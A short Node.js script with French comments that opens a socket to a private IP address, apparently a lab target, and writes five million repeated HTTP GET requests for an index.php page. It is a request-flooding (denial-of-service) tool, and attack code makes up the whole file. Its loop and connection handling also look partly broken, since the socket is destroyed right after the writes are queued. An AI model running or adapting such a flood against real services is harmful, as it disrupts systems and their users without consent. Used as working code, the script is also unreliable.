const net = require('net');

const target_host = "10.10.43.209";
const target_port = 5678;

// On créer une connexion socket
const client = new net.Socket();

// On connexte le client
client.connect(target_port, target_host, function() {
  console.log('Connecté');
});

// On envoi des requêtes GET
for (let i = 0; i < 5; i++) {
  for (let j = 0; j < 1000000; j++) {
    const request = Buffer.from(`GET http://10.10.43.209:5678/1.00/index.php HTTP/1.1\r\nHost: ${target_host}\r\n\r\n`);
    client.write(request);
  }
}

// On ferme la connexion
client.destroy();